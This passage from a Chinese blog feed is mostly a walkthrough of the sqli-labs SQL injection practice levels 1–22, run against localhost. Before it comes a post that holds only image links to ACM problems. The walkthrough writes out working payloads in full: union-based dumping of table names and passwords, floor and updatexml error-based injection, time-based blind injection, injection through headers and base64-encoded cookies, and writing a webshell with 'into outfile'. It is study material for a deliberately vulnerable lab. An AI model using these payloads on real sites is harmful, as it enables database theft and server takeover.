title="电梯升降"></a>电梯升降</h2><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi8kvz4czj30xi0fptaa.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggi8l3aex5j30tw0a574f.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi8lanjkpj30mx0h53ze.jpg" alt=""></p><h2 id="恶搞指数"><a href="#恶搞指数" class="headerlink" title="恶搞指数"></a>恶搞指数</h2><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi8midjcuj31690gr762.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi8moz827j30u00a6mxb.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi8mvmqelj30oe0hq3zi.jpg" alt=""></p><h2 id="挂盐水"><a href="#挂盐水" class="headerlink" title="挂盐水"></a>挂盐水</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi8oap28ij316g0ezjsv.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi8oi0whzj30tv08574d.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi8opqlp4j30ns0nuab9.jpg" alt=""></p><h2 id="闰年计数"><a href="#闰年计数" class="headerlink" title="闰年计数"></a>闰年计数</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggi8ryagi2j314w0lrwia.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggi8s3d9k4j30uf0mxwfo.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggi8sc7xeoj30pk0ofabd.jpg" alt=""></p><h2 id="小雏鸟看时间"><a href="#小雏鸟看时间" class="headerlink" title="小雏鸟看时间"></a>小雏鸟看时间</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggi8wcyzkoj313i0p7q7v.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi8wjx7z8j30rq0ej74p.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi8wrq4x8j30kx0hi0ts.jpg" alt=""></p><h2 id="大白的字符串"><a href="#大白的字符串" class="headerlink" title="大白的字符串"></a>大白的字符串</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi8yiig4fj30xt0owmyu.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi8z3om6wj30w006zaa4.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi8za0hntj30m20gp0tk.jpg" alt=""></p><h2 id="小雏鸟报时"><a href="#小雏鸟报时" class="headerlink" title="小雏鸟报时"></a>小雏鸟报时</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggi92fm0w7j311w0n3djp.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi92nga7nj30tt0d9wez.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi92z3xe8j30y50neta8.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi936oyzbj30w00p3jtd.jpg" alt=""></p><h2 id="小雏鸟的难题"><a href="#小雏鸟的难题" class="headerlink" title="小雏鸟的难题"></a>小雏鸟的难题</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi94mlw9cj310z0kpaci.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi94utjhij30ki0mtt9q.jpg" alt=""></p><h2 id="小雏鸟与大福"><a href="#小雏鸟与大福" class="headerlink" title="小雏鸟与大福"></a>小雏鸟与大福</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggi96bk7jaj30yl0jfju7.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggi96g9gilj30qj087dfw.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggi96qe69lj30ke0d30t5.jpg" alt=""></p><h2 id="牛轧糖"><a href="#牛轧糖" class="headerlink" title="牛轧糖"></a>牛轧糖</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggi98twv83j310h0fnjsw.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggi996g00rj30ua0apdfy.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi99c9g2fj30ld0e4wey.jpg" alt=""></p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggi9a5xi0nj30xh0m5jtd.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi9bqzpirj30ix0f0jry.jpg" alt=""></p><h2 id="马鞍数"><a href="#马鞍数" class="headerlink" title="马鞍数"></a>马鞍数</h2><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi9d2zjstj30xm0m7q59.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi9dj3efcj30sa092mxa.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggi9dps5x2j30gl0ogdgv.jpg" alt=""></p><h2 id="小雏鸟们参赛！"><a href="#小雏鸟们参赛！" class="headerlink" title="小雏鸟们参赛！"></a>小雏鸟们参赛！</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi9f08ddlj30xh0m6gnw.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi9fg1lqkj30rk09m74d.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi9fnlbe0j30k40dpt94.jpg" alt=""></p><h2 id="小雏鸟长大啦-6"><a href="#小雏鸟长大啦-6" class="headerlink" title="小雏鸟长大啦 6"></a>小雏鸟长大啦 6</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggia0yxsbuj30yo0nf40u.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggia1l1211j30in0biglx.jpg" alt=""></p><h2 id="小雏鸟扫雷"><a href="#小雏鸟扫雷" class="headerlink" title="小雏鸟扫雷"></a>小雏鸟扫雷</h2><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggiaa7wvgij30rr0o80v8.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggiaae2mqfj30nq0cj74f.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggiaaotcd8j30ku0plq4g.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CUMTOJ&quot;&gt;&lt;a href=&quot;#CUMTOJ&quot; class=&quot;headerlink&quot; title=&quot;CUMTOJ&quot;&gt;&lt;/a&gt;CUMTOJ&lt;/h1&gt;&lt;h2 id=&quot;财务管理&quot;&gt;&lt;a href=&quot;#财务管理&quot; class=&quot;headerlink&quot; title=&quot;财
      
    
    </summary>
    
    
      <category term="acm" scheme="https://devildragons.github.io/categories/acm/"/>
    
    
      <category term="cumt" scheme="https://devildragons.github.io/tags/cumt/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之sqli-labs学习</title>
    <link href="https://devildragons.github.io/2020/07/06/sqli-labs/"/>
    <id>https://devildragons.github.io/2020/07/06/sqli-labs/</id>
    <published>2020-07-05T16:00:00.000Z</published>
    <updated>2020-07-15T13:32:28.221Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入之sqli-labs学习"><a href="#SQL注入之sqli-labs学习" class="headerlink" title="SQL注入之sqli-labs学习"></a>SQL注入之sqli-labs学习</h1><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gghi1osyygj30yq0ij427.jpg" alt=""><br>经过语句and 1=2测试，页面返回正常，所以不是数值型注入。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gghi4ka3dnj31cn0iydko.jpg" alt=""><br>在id后面加上’，页面返回不正常，所以可能存在单引号注入。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gghi97nzf0j30xl0ixn0r.jpg" alt=""><br>使用–+将sql后面的语句注释掉后,页面返回正常，说明存在单引号字符型注入。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gghjqn7hj4j30g502g0sq.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gghibvs8gqj30wn0iq0w1.jpg" alt=""><br>使用order by语句判断该表中有几列数据。<br>order by 3页面回显正常，order by 4页面回显不正常，说明该表有3列数据。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gghiggb6rjj30vs0j7422.jpg" alt=""><br>但是发现并没有显示位。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gghihmbtz4j30v80iqgp4.jpg" alt=""><br>将id=1改为数据库不存在的值，如999，页面输出2和3，说明有2个显示位。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gghinkdjqlj31dh0iyjwx.jpg" alt=""><br><a href="http://localhost/sqli-labs-master/Less-1/?id=999&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/?id=999&#39;</a> union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+<br>查询数据库名信息。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gghis7sf3aj30wa0j7427.jpg" alt=""><br>或者<a href="http://localhost/sqli-labs-master/Less-1/?id=999&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/?id=999&#39;</a> union select 1,(select database()),3 –+也能查询数据库。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gghivf70b4j319k0j3wjl.jpg" alt=""><br><a href="http://localhost/sqli-labs-master/Less-1/?id=999&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/?id=999&#39;</a> union select 1,(select database()),(select group_concat(table_name) from information_schema.tables where table_schema=”security”) –+查询security数据库的表名。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gghixbrqq8j319f0ilwjj.jpg" alt=""><br><a href="http://localhost/sqli-labs-master/Less-1/?id=999&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/?id=999&#39;</a> union select 1,(select database()),(select group_concat(column_name) from information_schema.columns where table_name=”users”) –+查询users表中的列名。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gghj2ripx3j31ez0iyn2t.jpg" alt=""><br><a href="http://localhost/sqli-labs-master/Less-1/?id=999&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/?id=999&#39;</a> union select 1,(select database()),(select group_concat(password) from users) –+查询password列名中的信息。</p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gghj7zhrilj30y40izafp.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gghj8kkhzqj30we0it79l.jpg" alt=""><br>输入id=2-1页面发生变化，说明存在数值型注入。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gghjq0rhc9j30fn02oaa3.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gghjbxayfgj30w00iq43k.jpg" alt=""><br>order by 3页面正常，order by 4页面不正常，所以有3列数据。<br>然后使用联合查询进行注入，参考第一关的注入。</p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gghjjc91m8j31aa0iy461.jpg" alt=""><br>输入?id=1’ –+页面不正常。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gghjkga8q7j30w30ix0xz.jpg" alt=""><br>输入?id=1’) –+页面正常<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gghjo5s64oj30il036gln.jpg" alt=""><br>正如所测试的是以(‘’)方式闭合字符串。</p><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gghjtxl80xj30pf0isq6q.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gghju98tqjj30vn0isdl3.jpg" alt=""><br>?id=1” –+不正常，?id=1”) –+正常，说明是以(“”)的闭合方式。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gghk01x17yj30gj03t0st.jpg" alt=""><br>然后参考第一关进行联合语句注入。</p><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gghk2t5xgvj30v90ib0xn.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gghk3btzcbj30v10imn20.jpg" alt=""><br>没有显示位，不能使用联合注入。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gghk5gzbc1j31bt0irdnh.jpg" alt=""><br>用?id=1’出现错误语句，所以我们能用一个新的注入方法：报错注入。</p><p>(1). 通过floor报错<br>and (select 1 from (select count(<em>),concat((payload),floor (rand(0)</em>2))x from information_schema.tables group by x)a)<br>其中payload为你要插入的SQL语句<br>需要注意的是该语句将 输出字符长度限制为64个字符</p><p>(2). 通过updatexml报错<br>and updatexml(1,payload,1)<br>同样该语句对输出的字符长度也做了限制，其最长输出32位<br>并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效。</p><p>(3). 通过ExtractValue报错<br>and extractvalue(1, payload)<br>输出字符有长度限制，最长32位。</p><p>payload即我们要输入的sql查询语句</p><p>这里使用floor报错语句进行注入<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gghkud3zc8j31g00jxgtp.jpg" alt=""><br><a href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-5/?id=1&#39;</a> and (select 1 from(select count(<em>),concat((select schema_name from information_schema.schemata limit 6,1),floor (rand(0)*2))x from information_schema.tables group by x)a)–+查出数据库security。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gghkwrbol6j31d60jh46i.jpg" alt=""><br><a href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-5/?id=1&#39;</a> and (select 1 from(select count(</em>),concat((select table_name from information_schema.tables where table_schema=”security” limit 3,1),floor (rand(0)<em>2))x from information_schema.tables group by x)a)–+查出表名users。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gghkyo3x46j31d60jnwmh.jpg" alt=""><br><a href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-5/?id=1&#39;</a> and (select 1 from(select count(</em>),concat((select column_name from information_schema.columns where table_name=”users” limit 2,1),floor (rand(0)<em>2))x from information_schema.tables group by x)a)–+查出列名password。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gghl0hfyq4j31bd0ieahr.jpg" alt=""><br><a href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-5/?id=1&#39;</a> and (select 1 from(select count(</em>),concat((select password from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)–+查出password中的信息。</p><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gghl42a639j31c50ixn4v.jpg" alt=""><br>用?id=1”出现错误语句，所以参考第五关的报错注入对该题进行注入。</p><h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p>数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限</p><p>into outfile命令使用的环境：</p><p>我们必须知道，服务器上一个可以写入文件的文件夹的完整路径<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggin52oosej30uy0idq7q.jpg" alt=""><br>使用?id=1’))页面返回正常，说明是((‘’))方式闭合字符串。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggin6z21v4j30hq0380sr.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggin799df7j30xx0ivq8f.jpg" alt=""><br>本关卡提示我们使用file权限向服务器写入文件，所以尝试写入数据到自定义目录下。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggin9imytdj30kx04oq36.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggin9pq1zkj30d904lmxa.jpg" alt=""></p><p>数据写入成功。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggina5l900j31560ilgsj.jpg" alt=""><br>于是向自定义的目录下写入一句话木马。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gginb8oerzj30nt0ixaas.jpg" alt=""><br>访问写入的文件，从而上传一句话木马。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gginc2ls8dj30r4062wf2.jpg" alt=""><br>用菜刀或蚁剑连接。</p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gginkhpg66j310i0iw44b.jpg" alt=""><br>使用?id=1’ –+页面恢复正常。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gginlbll8bj31540j90zo.jpg" alt=""><br>参考第七关尝试写入数据成功，然后上传木马连接。</p><h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p>发现无论输入什么页面都没有变化。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gginr5d6zrj30x00ittdy.jpg" alt=""><br>使用?id=1’ and sleep(5) –+页面出现明显延迟，说明本关卡是时间盲注。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gginz6wrbrj30uj0j8gqi.jpg" alt=""><br>通过页面的延迟猜出数据库是8个字符。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggio1a1p8nj30vn0iuaf5.jpg" alt=""><br>逐个字符猜测得到数据库为security。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggio74gbfqj317h0ix106.jpg" alt=""><br>通过类似操作猜出表名users。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggio9ebof5j31840iwdne.jpg" alt=""><br>进而猜出列名password。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggioaxx2p8j311u0j1wkp.jpg" alt=""><br>进而猜出password中的信息。</p><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggiocjttaaj30xc0iijx0.jpg" alt=""><br>同样是时间盲注，只不过是双引号注入。注入过程参考第九关。</p><h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><p>从第十一关开始使用post的方式来提交数据<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggip4c5khbj30xl0kzq8z.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggip5js1jzj30wr0j6jwq.jpg" alt=""><br>使用万能密码以及order by测试出有两个显示位。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggipazyhyzj30tt0jw0yh.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggipb8qjhqj30wu0lbq8z.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggipd4gz1qj30wv0kodlu.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggipdadtiqj312o0kywkv.jpg" alt=""><br>然后使用联合注入依次查出数据库，表名，列名，列中的信息。</p><h2 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggipks25inj30yy0lb0yu.jpg" alt=""><br>经过测试发现本关是(“”)的字符闭合方式。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggipnv1ilej30xp053aac.jpg" alt=""><br>然后参考第十一关对本关进行联合注入。</p><h2 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggiq9hyia9j30zq0kqteq.jpg" alt=""><br>经过测试发现本关是以(‘’)字符的闭合方式，但是本题没有显示位，但是会有报错语句，所以使用报错注入的方法进行注入。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggiqbo9b54j30yf0in0y6.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggiqbufe53j30zg0k4afk.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggiqc22xopj30zy0k20yd.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggiqc857zcj30yh0kmdld.jpg" alt=""><br>通过报错注入获得数据库，表名，列名，列中的信息。</p><h2 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggqihzcffgj30vx0k4n31.jpg" alt=""><br>经过测试发现本关是以双引号字符的闭合方式，但是本题没有报错语句，所以使用时间盲注的方法进行注入。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggqikgn850j30yh0k7q8a.jpg" alt=""><br>使用admin” and if(length(database())=8,sleep(5),0)#猜测出数据库的长度。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggqinh4n6uj30y80iqn2i.jpg" alt=""><br>使用admin” and if(left(database(),8)=”security”,sleep(5),0)#猜测出数据库名为security。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggqioz96y6j31090m2wjz.jpg" alt=""><br>使用admin” and if(left((select table_name from information_schema.tables where table_schema=”security” limit 3,1),5)=”users”,sleep(5),0)#猜出表名为users。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggqiq7ayskj31050m1gr2.jpg" alt=""><br>使用admin” and if(left((select column_name from information_schema.columns where table_name=”users” limit 2,1),8)=”password”,sleep(5),0)#猜出列名为password。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggqir13y64j30yy0jste3.jpg" alt=""><br>使用admin” and if(left((select password from users limit 0,1),4)=”dumb”,sleep(5),0)#猜出password中的信息。</p><h2 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggqiw351ffj30yq0mfgrm.jpg" alt=""><br>测试发现是单引号字符的闭合方式，一样的没有报错语句和显示位，参考第十四关使用时间盲注进行注入。</p><h2 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h2><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggqj1ndrwhj30x80ledls.jpg" alt=""><br>本关采用(“”)的闭合方式，无显示位和报错语句，参考十四关采用时间盲注进行注入。</p><h2 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggqmbpk51dj30y10m7qch.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggrr4t5t7lj30hd04nwel.jpg" alt=""><br>用户名使用check_input()对 username 进行各种转义的处理,所以本关不能对用户名进行注入，但能对密码进行注入，没有显示位但是有错误信息，所以使用报错注入。<br>参考：<a href="https://blog.csdn.net/Kevinhanser/article/details/81519279" target="_blank" rel="noopener" title="报错型更新语句盲注">https://blog.csdn.net/Kevinhanser/article/details/81519279</a><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggqmrg4ldfj310e0m7ajr.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggqmro0lchj310b0mkn6u.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggqms4sb5cj30ym0m912d.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggqmscefgwj30xc0mg7ds.jpg" alt=""><br>使用报错注入依次获得数据库，表名，列名，以及列名中的信息。</p><h2 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggrq8mmz13j30v20hh0t7.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggrr7ie0hdj30hv047glp.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggrrgo3ekpj3105023aa5.jpg" alt=""><br>打开发现显示了IP地址，百度后发现，本关是header头注入，修改http头的User-Agent参数。<br>查看源码发现。本关对用户名和密码都进行了各种转义的处理，所以都不能注入。并且发现了insert语句，他把user-agent插入到了数据库。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggrqf7jw0ij30yi0jg0yy.jpg" alt=""><br>需要登录成功后才能注入。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggrrqh66ndj31320oz42d.jpg" alt=""><br>修改user-agent的值使其符合整个insert into的语句，闭合后应该为indert into table values(‘1’,1,1)#’,’IP’,’Username’),成功绕过。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggrrx7cba3j311i0okq6z.jpg" alt=""><br>接着使用报错注入获得数据库名security。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggrrze5svpj30w30omtci.jpg" alt=""><br>继续获得表名users。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggrs0xla4bj30ws0oitci.jpg" alt=""><br>获得列名password。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggrs2mpwgmj312b0phtcx.jpg" alt=""><br>获得列名中的信息。<br>参考：<a href="https://www.cnblogs.com/AmoBlogs/p/8677729.html" target="_blank" rel="noopener">https://www.cnblogs.com/AmoBlogs/p/8677729.html</a></p><h2 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggrwtl0g35j30yr0kcjxi.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggrwt1gezaj30vq02u74f.jpg" alt=""><br>和第十八关类似，只不过本关是将referer插入数据库。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggrwvpman5j31100q6tf4.jpg" alt=""><br>修改referer的值使其符合整个insert into的语句，闭合后应该为indert into table values(‘1’,1)#’,’IP’),成功绕过。<br>然后参考第十八进行报错注入。</p><h2 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggrx712wtuj313a0gun52.jpg" alt=""><br>题目给了cookie:uname=admin所以这题应该是cookie注入。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggrxh6punyj31g50nun6j.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggrxjzrua5j31h20osdpt.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggrxlylr13j31gl0o9tik.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggrxmxeq80j31d90o0dp8.jpg" alt=""><br>然后参考第十八关进行报错注入。</p><h2 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggry1sm3eoj30ne05kgly.jpg" alt=""><br>查看源代码发现本关是将cookie的内容base64解密后再运行，而且cookie是以(‘’)的字符闭合方式。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggry9ipe8ij31fo0q97cw.jpg" alt=""><br>构造payload：admin’) and updatexml(1,concat(0x7e,database(),0x7e),1)#base64加密后通过报错注入获得数据库名。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggryc861tcj31gn0opahl.jpg" alt=""><br>构造payload:admin’) and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=”security” limit 3,1),0x7e),1)#base64加密后获得表名。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggryei7lxvj31gp0ojdnd.jpg" alt=""><br>构造payload:admin’) and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=”users” limit 2,1),0x7e),1)#base64加密后获得列名。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggryh69yz9j31eh0og7bi.jpg" alt=""><br>构造payload:admin’) and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)#base64加密后获得密码。</p><h2 id="第二十二关"><a href="#第二十二关" class="headerlink" title="第二十二关"></a>第二十二关</h2><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggryjrxus4j30l503ugls.jpg" alt=""><br>通过查看源代码发现cookie是以双引号字符的闭合方式，和第二十一关一样是base64解密后再执。所以参考第二十一关进行报错注入，构造的payload为admin” and updatexml(1,payload,1)。</p><h2 id="第二十三关"><a href="#第二十三关" class="headerlink" title="第二十三关"></a>第二十三关</h2><p><img 